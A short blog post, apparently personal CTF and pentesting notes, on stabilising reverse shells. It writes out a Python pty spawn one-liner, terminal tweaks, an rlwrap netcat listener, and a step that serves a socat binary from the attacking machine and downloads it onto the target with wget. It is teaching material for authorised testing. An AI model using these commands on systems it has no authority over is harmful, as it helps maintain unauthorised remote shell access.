+++
title = 'Stabilizing Shells'
date = 2023-09-26T16:00:46+08:00
draft = false
tags = ["Shell Stabilization", "Reverse Shell", "Bind Shell"]
+++

### Introduction
Spawning shells in CTFs and pentesting is an extremely common task and we don't want to have to deal getting disconnected from target, as well as the inconvenience of using a shell with limited shortcuts and controls. Here are 3 methods to stabilize your shell. Personally, I like to use Technique 1 in CTFs.

### Technique 1: Python 
Applicable to on Linux, since they almost always have Python installed. 
1. `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell;
2. `export TERM=xterm` -- this will give us access to term commands such as `clear`.
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type `reset` and press enter.


### Technique 2: rlwrap
rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
To use rlwrap, we invoke a slightly different listener:
`rlwrap nc -lvnp <port>`

When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell. This is also great to use for Windows shells.

### Technique 3: [[socat]]
Limited to Linux; won't be more stable on Windows machine. 

To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).

